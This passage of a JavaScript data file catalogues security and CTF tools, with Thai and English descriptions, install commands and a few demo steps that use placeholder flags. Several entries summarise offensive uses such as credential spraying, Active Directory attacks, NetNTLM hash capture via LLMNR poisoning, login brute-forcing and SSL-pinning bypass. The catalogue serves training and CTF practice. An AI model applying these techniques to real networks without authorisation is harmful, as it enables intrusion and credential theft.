    tagline: { th: "สร้าง/แก้/ยิงแพ็กเก็ตด้วย Python", en: "Craft/edit/send packets in Python" },
    description: { th: "ประกอบแพ็กเก็ตทีละ layer ยิงเอง อ่าน pcap และเขียนสคริปต์วิเคราะห์ทราฟฟิก", en: "Builds packets layer by layer, sends them, reads pcaps and scripts traffic analysis." },
    official: "https://scapy.readthedocs.io/", install: ["pipx install scapy"], tags: ["packets", "python", "craft"],
  },
  {
    id: "netexec", name: "NetExec (nxc)", category: "network", difficulty: 3,
    tagline: { th: "โจมตี AD/SMB/WinRM หลายโฮสต์", en: "Attack AD/SMB/WinRM at scale" },
    description: { th: "ทายาทของ CrackMapExec ใช้ spray credential, enum share, รันคำสั่งบนเครือข่าย Windows", en: "The CrackMapExec successor: spray credentials, enumerate shares and run commands across Windows networks." },
    official: "https://github.com/Pennyw0rth/NetExec", install: ["pipx install netexec"], tags: ["ad", "smb", "lateral"],
  },
  {
    id: "impacket", name: "Impacket", category: "network", difficulty: 3,
    tagline: { th: "ชุดสคริปต์โปรโตคอล Windows", en: "Windows protocol script suite" },
    description: { th: "รวมสคริปต์ (secretsdump, psexec, GetNPUsers) สำหรับโจมตี Active Directory", en: "A suite (secretsdump, psexec, GetNPUsers) for attacking Active Directory." },
    official: "https://github.com/fortra/impacket", install: ["pipx install impacket"], tags: ["ad", "kerberos", "smb"],
  },
  {
    id: "responder", name: "Responder", category: "network", difficulty: 3,
    tagline: { th: "ดัก hash จาก LLMNR/NBT-NS poisoning", en: "Capture hashes via LLMNR/NBT-NS poisoning" },
    description: { th: "ปลอมตอบ LLMNR/NBT-NS เพื่อดัก NetNTLM hash ในเครือข่าย Windows (สแล็บ lab)", en: "Spoofs LLMNR/NBT-NS replies to capture NetNTLM hashes on Windows LANs (lab use)." },
    official: "https://github.com/lgandx/Responder", install: ["pipx install responder"], tags: ["poisoning", "ntlm", "mitm"],
  },

  // ── password ──
  {
    id: "crunch", name: "crunch", category: "password", difficulty: 1,
    tagline: { th: "สร้าง wordlist ตามแพทเทิร์น", en: "Generate wordlists by pattern" },
    description: { th: "สร้างลิสต์รหัสตามชุดอักขระ/ความยาว/รูปแบบที่กำหนด", en: "Generates password lists from a charset, length and pattern spec." },
    official: "https://github.com/crunchsec/crunch", install: ["brew install crunch"], tags: ["wordlist", "generate"],
  },
  {
    id: "medusa", name: "Medusa", category: "password", difficulty: 2,
    tagline: { th: "brute login แบบขนาน (คู่แข่ง Hydra)", en: "Parallel login brute-forcer (Hydra rival)" },
    description: { th: "เดารหัสบริการเครือข่ายแบบขนานความเร็วสูง รองรับหลายโปรโตคอล", en: "High-speed parallel brute-forcing of network service logins across many protocols." },
    official: "https://github.com/jmk-foofus/medusa", install: ["brew install medusa"], tags: ["bruteforce", "login"],
  },
  {
    id: "cupp", name: "CUPP", category: "password", difficulty: 1,
    tagline: { th: "สร้าง wordlist จากข้อมูลส่วนตัวเป้าหมาย", en: "Build wordlists from a target's profile" },
    description: { th: "ถามข้อมูล (ชื่อ, วันเกิด, สัตว์เลี้ยง) แล้วสร้างรหัสที่คนมักตั้งจริง", en: "Asks for details (name, birthday, pet) and generates the passwords people actually pick." },
    official: "https://github.com/Mebus/cupp", install: ["# git clone; python3 cupp.py -i"], tags: ["wordlist", "osint", "profile"],
  },

  // ── mobile ──
  {
    id: "mobsf", name: "MobSF", category: "mobile", difficulty: 2,
    tagline: { th: "วิเคราะห์แอปมือถืออัตโนมัติ (static+dynamic)", en: "Automated mobile app analysis (static+dynamic)" },
    description: { th: "อัป APK/IPA แล้วได้รายงานช่องโหว่, permission, hardcoded secret, endpoint ครบ", en: "Upload an APK/IPA and get a full report of vulns, permissions, hardcoded secrets and endpoints." },
    official: "https://mobsf.github.io/docs/", install: ["# docker run opensecurity/mobile-security-framework-mobsf"], tags: ["apk", "ios", "scanner"],
  },
  {
    id: "objection", name: "Objection", category: "mobile", difficulty: 3,
    tagline: { th: "สำรวจ/แก้แอปตอนรันบน Frida", en: "Runtime mobile exploration on Frida" },
    description: { th: "bypass SSL pinning, root/jailbreak detection, ดู class/method ตอนรันโดยไม่ต้อง repack", en: "Bypass SSL pinning and root/jailbreak checks, and inspect classes/methods at runtime without repacking." },
    official: "https://github.com/sensepost/objection", install: ["pipx install objection"], tags: ["frida", "runtime", "bypass"],
  },
  {
    id: "apkleaks", name: "APKLeaks", category: "mobile", difficulty: 1,
    tagline: { th: "หา secret/URI/endpoint ใน APK", en: "Scan APKs for secrets/URIs/endpoints" },
    description: { th: "สแกน APK หา API key, URL, endpoint ที่ hardcode ไว้ อย่างรวดเร็ว", en: "Quickly scans an APK for hardcoded API keys, URLs and endpoints." },
    official: "https://github.com/dwisiswant0/apkleaks", install: ["pipx install apkleaks"], tags: ["apk", "secrets", "recon"],
    demo: { title: { th: "หา secret ที่ฝังใน APK", en: "Find secrets baked in an APK" }, prompt: "ctf", steps: [
      { cmd: "apkleaks -f app.apk", out: "[LinkFinder]\n- https://api.ctf.local/v1/flag\n[Google API Key]\n- AIzaSyA...redacted\n[Generic Secret]\n- CTT{4pk_l34ks_s3cr3ts}" },
      { comment: "hardcoded flag + a live endpoint + a leaked API key" } ] },
  },

  // ── misc ──
  {
    id: "jq", name: "jq", category: "misc", difficulty: 1, installed: true,
    tagline: { th: "ประมวลผล JSON บนคอมมานด์ไลน์", en: "Process JSON on the command line" },
    description: { th: "กรอง แปลง และดึงค่าจาก JSON — ใช้กับ API response และไฟล์ config บ่อย", en: "Filter, transform and extract from JSON — constantly useful for API responses and config files." },
    official: "https://jqlang.github.io/jq/manual/", install: ["brew install jq"],
    usage: [{ cmd: "curl -s api/x | jq '.data[].flag'", desc: { th: "ดึงฟิลด์ flag ทุกตัว", en: "Pull every flag field" } }],
    tags: ["json", "parse"],
    demo: { title: { th: "ดึงค่าจาก JSON ด้วย jq", en: "Extract from JSON with jq" }, prompt: "ctf", steps: [
      { cmd: "curl -s http://10.10.11.42/api/users | jq '.[] | select(.role==\"admin\") | .token'", out: "\"CTT{jq_f1lt3rs_j50n}\"" },
      { comment: "filtered the admin user's token straight out of the response" } ] },
  },
  {
    id: "ffmpeg", name: "FFmpeg", category: "misc", difficulty: 2, installed: true,
    tagline: { th: "แปลง/แยกไฟล์เสียง-วิดีโอ", en: "Convert / dissect audio & video" },
    description: { th: "แปลงฟอร์แมต, แยกเฟรม, ดึง stream ที่ซ่อน — โจทย์มีเดียใช้บ่อย", en: "Transcode, extract frames and pull hidden streams — a staple for media challenges." },
    official: "https://ffmpeg.org/documentation.html", install: ["brew install ffmpeg"],
    usage: [{ cmd: "ffmpeg -i in.mp4 -map 0 out/", desc: { th: "แยกทุก stream ออกมา", en: "Extract every stream" } }],
    tags: ["audio", "video", "convert"],
  },
  {
    id: "imagemagick", name: "ImageMagick", category: "misc", difficulty: 1, installed: true,
    tagline: { th: "แปลง/วิเคราะห์รูปบนคอมมานด์ไลน์", en: "Convert / inspect images on the CLI" },
    description: { th: "แปลงฟอร์แมต, ปรับ contrast เผยข้อความจาง, แยกเฟรม GIF — งานรูปทั่วไป", en: "Converts formats, boosts contrast to reveal faint text, splits GIF frames — general image work." },
    official: "https://imagemagick.org/", install: ["brew install imagemagick"],
    usage: [{ cmd: "magick in.png -auto-level out.png", desc: { th: "ดึง contrast เผยข้อความซ่อน", en: "Stretch contrast to reveal hidden text" } }],
    tags: ["image", "convert"],
  },
  {
    id: "gnupg", name: "GnuPG (gpg)", category: "misc", difficulty: 2, installed: true,
    tagline: { th: "เข้ารหัส/ถอด/เซ็นด้วย PGP", en: "PGP encrypt / decrypt / sign" },
    description: { th: "จัดการไฟล์ .gpg/.asc, ถอดข้อความ PGP, ตรวจลายเซ็น — โจทย์ crypto/forensic", en: "Handles .gpg/.asc files, decrypts PGP messages and verifies signatures — crypto/forensic challenges." },
    official: "https://gnupg.org/documentation/", install: ["brew install gnupg"],
    usage: [{ cmd: "gpg -d secret.gpg", desc: { th: "ถอดไฟล์ที่เข้ารหัส", en: "Decrypt an encrypted file" } }],
    tags: ["pgp", "encrypt", "sign"],
  },
];

export default tools;
